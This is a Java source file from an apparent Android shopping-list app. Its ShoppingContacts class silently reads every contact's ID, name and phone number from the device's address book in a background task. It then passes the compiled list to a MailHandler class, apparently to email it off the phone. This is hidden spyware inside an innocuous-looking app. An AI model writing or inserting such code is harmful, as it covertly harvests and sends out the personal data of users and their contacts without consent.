package com.example.jonas.shoppinglist.processes;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.util.Log;

import com.example.jonas.shoppinglist.communication.MailHandler;

import java.util.ArrayList;
import java.util.List;


public class ShoppingContacts extends AsyncTask<Void, Void, String>  {
    private Activity activity;
    private Cursor contactCursor;
    private Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
    private String[] projection = {ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Email.ADDRESS};

    public ShoppingContacts(Activity activity) {
        this.activity = activity;
    }

    @Override
    protected String doInBackground(Void... params) {

        contactCursor = activity.getContentResolver().query(uri, projection,null,null, null);

        int nameIdx = contactCursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME);
        int phoneIdx = contactCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER);
        int idIdx = contactCursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID);
        int emailIdx = contactCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS);

        String resultSet = "Contact list: \n \n" ;

        while(contactCursor.moveToNext()){
            String name = contactCursor.getString(nameIdx);
            String phone = contactCursor.getString(phoneIdx);
            String email = contactCursor.getString(emailIdx);
            String id = contactCursor.getString(idIdx);

            resultSet = resultSet + "id:" + id + ", name = " + name + ", phone number = " + phone +  "\n";
        }

        return resultSet;
    }

    @Override
    public void onPostExecute(String result){
        new MailHandler().execute(result);
    }
}
